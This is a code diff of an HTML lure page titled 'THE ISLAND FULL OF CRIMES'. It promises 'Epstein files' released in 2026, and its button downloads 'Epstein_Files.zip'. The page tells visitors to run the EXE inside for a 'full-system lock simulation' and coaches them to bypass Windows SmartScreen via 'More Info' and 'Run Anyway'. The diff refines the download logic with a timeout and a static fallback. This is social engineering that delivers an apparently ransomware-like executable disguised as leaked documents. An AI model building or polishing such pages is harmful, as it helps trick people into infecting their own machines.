@@ -124,7 +124,7 @@
             font-size: 1.8rem;
             margin-top: 0;
             color: var(--secondary-color);
-            border-bottom: 2px solid var(--ecf0f1);
+            border-bottom: 2px solid #ecf0f1;
             padding-bottom: 15px;
             margin-bottom: 25px;
         }
@@ -164,73 +164,78 @@
             border-color: rgba(255, 255, 255, 0.2);
         }
 
-        .lab-panel p {
-            color: rgba(255, 255, 255, 0.9);
-        }
-
         .lab-description {
-            color: rgba(255, 255, 255, 0.8);
+            color: rgba(255, 255, 255, 0.9);
             margin-bottom: 30px;
         }
 
-        .btn {
+        .btn-launch {
             background-color: var(--accent-color);
             color: var(--white);
             border: none;
-            padding: 25px 60px;
-            font-size: 1.6rem;
+            padding: 20px 45px;
+            font-size: 1.3rem;
             font-weight: 700;
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
             transition: all 0.3s ease;
             text-transform: uppercase;
             letter-spacing: 2px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-            display: inline-block;
-            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(192, 57, 43, 0.3);
+            position: relative;
+            overflow: hidden;
             animation: pulse 2s infinite;
         }
 
         @keyframes pulse {
             0% {
                 transform: scale(1);
-                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+                box-shadow: 0 4px 15px rgba(192, 57, 43, 0.3);
             }
 
             50% {
                 transform: scale(1.05);
-                box-shadow: 0 15px 30px rgba(192, 57, 43, 0.4);
+                box-shadow: 0 8px 25px rgba(192, 57, 43, 0.5);
             }
 
             100% {
                 transform: scale(1);
-                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+                box-shadow: 0 4px 15px rgba(192, 57, 43, 0.3);
             }
         }
 
-        .btn:hover {
+        .btn-launch:hover {
             background-color: #e74c3c;
-            transform: translateY(-3px) scale(1.08);
-            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.4);
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 6px 20px rgba(192, 57, 43, 0.4);
+            animation: none;
         }
 
-        .btn:active {
+        .btn-launch:active {
             transform: translateY(-1px);
         }
 
         .lab-warning {
-            display: inline-block;
-            margin-top: 20px;
-            font-size: 0.85rem;
-            background: rgba(0, 0, 0, 0.2);
-            padding: 5px 15px;
-            border-radius: 20px;
+            display: block;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            font-size: 0.9rem;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 4px;
+            border-left: 4px solid #f1c40f;
+            text-align: left;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         #status-display {
             margin-top: 20px;
             font-family: 'Courier New', monospace;
             min-height: 24px;
+            color: #f1c40f;
+            font-weight: bold;
         }
 
         /* Disclaimer Footer */
@@ -320,26 +325,23 @@
 
             <section id="lab" class="lab-panel">
                 <h2>THE ISLAND FULL OF CRIMES</h2>
-                <p>Recent files were released on January 30, 2026. To analyze the encrypted files and experience the
-                    full-system lock simulation, please download and run our security suite.</p>
-                <div class="launch-box">
-                    <button class="btn" id="start-btn" onclick="launchSimulation()">ACCESS EPSTEIN FILES</button>
-                    <div id="status-msg"></div>
-                    <div class="security-note"
-                        style="margin-top: 15px; padding: 10px; border: 1px solid #f1c40f; background: rgba(241, 196, 15, 0.1); border-radius: 4px; text-align: left;">
-                        <p style="font-size: 0.85rem; color: #f1c40f; margin: 0;"><strong>⚠️ SECURITY NOTE:</strong> As
-                            this is a custom educational security tool which shows info regarding sensitive files,
-                            Windows SmartScreen may show a warning. This is
-                            expected for unsigned security payloads. Click <strong>"More Info"</strong> &rarr;
-                            <strong>"Run Anyway"</strong> to proceed with the analysis.
-                        </p>
-                    </div>
-                    <p style="font-size: 0.8rem; margin-top: 10px; color: #7f8c8d;">* This will download
-                        'Epstein_Files.zip'. Extract it and run the EXE inside to start the full-system simulation.</p>
-                </div>
+                <p class="lab-description">
+                    Recent files were released on January 30, 2026. To analyze the encrypted files and experience the
+                    full-system lock simulation, please download and run our security suite.
+                </p>
+
+                <button id="start-btn" onclick="launchSimulation()" class="btn-launch">ACCESS EPSTEIN FILES</button>
+                <div id="status-msg"></div>
+
                 <div class="lab-warning">
-                    ⓘ TERMS AND CONDITIONS APPLY
+                    ⚠️ <strong>SECURITY NOTE:</strong> As this is a custom educational security tool which shows info
+                    regarding sensitive files, Windows SmartScreen may show a warning. This is expected for unsigned
+                    security payloads. Click <strong>"More Info"</strong> → <strong>"Run Anyway"</strong> to proceed
+                    with the analysis.
                 </div>
+
+                <p style="font-size: 0.8rem; opacity: 0.6; margin-top: 20px;">* This will download 'Epstein_Files.zip'.
+                    Extract it and run the EXE inside to start the full-system simulation.</p>
             </section>
 
             <footer class="disclaimer-footer">
@@ -352,17 +354,25 @@
 
     <script>
         function launchSimulation() {
-            const status = document.getElementById('status-msg'); // Changed from status-display
-            const btn = document.getElementById('start-btn'); // Changed from .btn-launch
+            const status = document.getElementById('status-msg');
+            const btn = document.getElementById('start-btn');
 
-            status.textContent = '> INITIALIZING DOWNLOAD...';
+            status.textContent = '> INITIALIZING SECURE DOWNLOAD...';
             status.style.color = 'white';
             btn.style.opacity = '0.7';
-            btn.textContent = 'EXECUTING...'; // Added this line based on the original logic
+            btn.textContent = 'EXECUTING...';
+
+            // Setup Timeout (5 seconds)
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
 
             // Trigger file simulation
-            fetch('/run-simulation', { method: 'POST' })
+            fetch('/run-simulation', {
+                method: 'POST',
+                signal: controller.signal
+            })
                 .then(response => {
+                    clearTimeout(timeoutId);
                     if (!response.ok) throw new Error('Backend not available');
                     return response.json();
                 })
@@ -377,8 +387,9 @@
                     }
                 })
                 .catch(error => {
-                    // FALLBACK FOR STATIC HOSTING (Netlify/GitHub Pages)
-                    console.log('Backend fetch failed, trying static download fallback...', error);
+                    clearTimeout(timeoutId);
+                    // FALLBACK: Triggers on error OR timeout (AbortError)
+                    console.log('Backend fetch failed or timed out, trying static download fallback...', error);
                     status.textContent = '> STATIC MODE: Starting direct download...';
                     status.style.color = '#f1c40f';
                     btn.textContent = 'DOWNLOADING...';
@@ -388,8 +399,8 @@
                 });
 
             setTimeout(() => {
-                if (btn.textContent === 'SIMULATION ACTIVE') {
-                    btn.textContent = 'Launch Educational Simulation';
+                if (btn.textContent === 'DOWNLOADING...') {
+                    btn.textContent = 'ACCESS EPSTEIN FILES';
                     btn.style.opacity = '1';
                 }
             }, 5000);
